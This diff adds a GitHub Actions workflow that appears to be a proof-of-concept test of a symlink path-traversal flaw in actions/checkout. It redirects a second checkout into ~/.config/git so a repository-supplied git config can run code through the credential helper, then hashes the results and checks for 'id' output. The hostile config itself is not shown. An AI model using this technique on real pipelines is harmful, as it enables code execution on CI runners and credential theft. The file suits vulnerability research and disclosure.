@@ -1,0 +1,100 @@
+name: checkout-parent-rce-live
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  control:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803
+        with:
+          repository: StealthyBugs/checkout-rce-data-c5cfbf9b9f35
+          ref: 498bb2d67d968a36e26f35b55225d456fa19bd7f
+          path: lower-data
+          persist-credentials: false
+          set-safe-directory: false
+      - name: Prepare ordinary directory and trusted global config
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p "$HOME/.config/git" "$GITHUB_WORKSPACE/lower-data/ordinary"
+          printf %s 'W2NyZWRlbnRpYWxdCgloZWxwZXIgPQpbdXNlcl0KCW5hbWUgPSBPd25lckNvbnRyb2wK' | base64 -d > "$HOME/.config/git/config"
+          rm -f "$RUNNER_TEMP/checkout-rce-id-c5cfbf9b9f35"
+      - id: second_checkout
+        continue-on-error: true
+        uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803
+        with:
+          repository: StealthyBugs/checkout-rce-data-c5cfbf9b9f35
+          ref: 498bb2d67d968a36e26f35b55225d456fa19bd7f
+          path: lower-data/ordinary
+          persist-credentials: false
+          set-safe-directory: false
+      - name: Fixed Git credential consumer and control readback
+        if: always()
+        shell: bash
+        env:
+          CHECKOUT_OUTCOME: ${{ steps.second_checkout.outcome }}
+        run: |
+          set +e
+          printf 'protocol=https\nhost=controlled.invalid\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill >/dev/null 2>/dev/null
+          credential_status=$?
+          set -e
+          CHECKOUT_OUTCOME="$CHECKOUT_OUTCOME" CREDENTIAL_STATUS="$credential_status" python3 - <<'PY'
+          import hashlib,json,os,re
+          h=lambda p:hashlib.sha256(open(p,'rb').read()).hexdigest()
+          marker=os.environ['RUNNER_TEMP']+'/checkout-rce-id-c5cfbf9b9f35'
+          config=os.path.expanduser('~/.config/git/config')
+          value={'case':'ordinary-control','checkout_outcome':os.environ['CHECKOUT_OUTCOME'],'credential_status':int(os.environ['CREDENTIAL_STATUS']),'marker_exists':os.path.isfile(marker),'config_exists':os.path.isfile(config),'config_sha256':h(config) if os.path.isfile(config) else None,'trusted_config_intact':os.path.isfile(config) and h(config)=='c6155845b5e52c327798b73a7208c5700908394eb50fe77c4d6c2846104caa88','ordinary_realpath_inside':os.path.realpath(os.environ['GITHUB_WORKSPACE']+'/lower-data/ordinary').startswith(os.path.realpath(os.environ['GITHUB_WORKSPACE'])+os.sep)}
+          print('CHECKOUT_RCE_PROJECTION '+json.dumps(value,sort_keys=True,separators=(',',':')))
+          PY
+
+  candidate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out lower repository strictly as data
+        uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803
+        with:
+          repository: StealthyBugs/checkout-rce-data-c5cfbf9b9f35
+          ref: 498bb2d67d968a36e26f35b55225d456fa19bd7f
+          path: lower-data
+          persist-credentials: false
+          set-safe-directory: false
+      - name: Verify lower symlink and prepare trusted global config
+        shell: bash
+        run: |
+          set -euo pipefail
+          test -L "$GITHUB_WORKSPACE/lower-data/stage"
+          test "$(readlink "$GITHUB_WORKSPACE/lower-data/stage")" = '/home/runner/.config/git'
+          test "$(realpath "$GITHUB_WORKSPACE/lower-data/stage")" = "$HOME/.config/git"
+          mkdir -p "$HOME/.config/git"
+          printf %s 'W2NyZWRlbnRpYWxdCgloZWxwZXIgPQpbdXNlcl0KCW5hbWUgPSBPd25lckNvbnRyb2wK' | base64 -d > "$HOME/.config/git/config"
+          printf %s owner-canary > "$HOME/.config/git/owner-canary.bin"
+          rm -f "$RUNNER_TEMP/checkout-rce-id-c5cfbf9b9f35"
+      - id: second_checkout
+        name: Checkout lower data into its symlinked destination
+        continue-on-error: true
+        uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803
+        with:
+          repository: StealthyBugs/checkout-rce-data-c5cfbf9b9f35
+          ref: 498bb2d67d968a36e26f35b55225d456fa19bd7f
+          path: lower-data/stage
+          persist-credentials: false
+          set-safe-directory: false
+      - name: Fixed benign Git credential consumer and protected readback
+        if: always()
+        shell: bash
+        env:
+          CHECKOUT_OUTCOME: ${{ steps.second_checkout.outcome }}
+        run: |
+          set +e
+          printf 'protocol=https\nhost=controlled.invalid\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill >/dev/null 2>/dev/null
+          credential_status=$?
+          set -e
+          CHECKOUT_OUTCOME="$CHECKOUT_OUTCOME" CREDENTIAL_STATUS="$credential_status" python3 - <<'PY'
+          import hashlib,json,os,re
+          h=lambda p:hashlib.sha256(open(p,'rb').read()).hexdigest()
+          ws=os.environ['GITHUB_WORKSPACE']; marker=os.environ['RUNNER_TEMP']+'/checkout-rce-id-c5cfbf9b9f35'; config=os.path.expanduser('~/.config/git/config'); data=open(marker,'rb').read() if os.path.isfile(marker) else b''
+          value={'case':'symlink-candidate','checkout_outcome':os.environ['CHECKOUT_OUTCOME'],'credential_status':int(os.environ['CREDENTIAL_STATUS']),'stage_is_symlink':os.path.islink(ws+'/lower-data/stage'),'stage_realpath_is_global_config':os.path.realpath(ws+'/lower-data/stage')==os.path.expanduser('~/.config/git'),'config_exists':os.path.isfile(config),'config_sha256':h(config) if os.path.isfile(config) else None,'config_matches_lower':os.path.isfile(config) and h(config)=='e4807d19a4e1daa9f14ca0ab0ae74680d3915a95c72a28ba3189d155c17c82e4','owner_canary_exists':os.path.isfile(os.path.expanduser('~/.config/git/owner-canary.bin')),'marker_exists':os.path.isfile(marker),'marker_sha256':hashlib.sha256(data).hexdigest() if data else None,'marker_bytes':len(data),'id_shape':bool(re.search(rb'uid=[0-9]+\([^)]*\).*gid=[0-9]+\([^)]*\)',data)),'scripts_directly_executed':False,'secret_input_supplied':False}
+          print('CHECKOUT_RCE_PROJECTION '+json.dumps(value,sort_keys=True,separators=(',',':')))
+          PY
